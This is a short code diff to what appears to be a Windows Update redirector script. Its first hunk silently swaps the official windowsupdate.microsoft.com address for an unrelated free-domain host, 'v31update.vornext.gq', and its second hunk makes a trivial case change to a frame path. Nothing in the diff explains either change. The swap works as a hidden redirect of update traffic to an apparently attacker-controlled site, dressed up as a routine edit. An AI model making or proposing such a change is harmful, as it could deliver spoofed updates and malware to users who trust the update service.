@@ -36,7 +36,7 @@ var conThanks64BitBrowser = 10;
 
 // URLs and related constants, keep these lower case to ensure
 // comparisons below are done correctly.
-var V3Site = "http://windowsupdate.microsoft.com"
+var V3Site = "http://v31update.vornext.gq"
 var V4Site = "http://v4.windowsupdate.microsoft.com";
 var V5Site = "http://v5.windowsupdate.microsoft.com";
 var V6Site = "http://update.microsoft.com/windowsupdate";
@@ -575,7 +575,7 @@ Redirector.prototype =
     {
         document.open();
         document.write("<FRAMESET ROWS=100%>");
-        document.write("<FRAME SRC=\"R1201/V31site/default.htm" + location.search + "\">");
+        document.write("<FRAME SRC=\"R1201/V31Site/default.htm" + location.search + "\">");
         document.write("</FRAMESET>");
         document.close();
     },
